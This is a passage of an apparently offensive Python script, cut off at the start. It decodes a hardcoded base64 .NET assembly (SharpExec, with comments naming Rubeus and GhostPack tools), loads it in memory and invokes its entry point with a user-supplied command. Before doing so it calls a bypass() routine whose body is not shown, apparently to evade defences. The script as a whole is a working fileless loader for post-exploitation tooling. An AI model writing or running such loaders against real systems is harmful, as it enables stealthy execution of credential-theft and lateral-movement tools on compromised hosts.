        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpExec.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()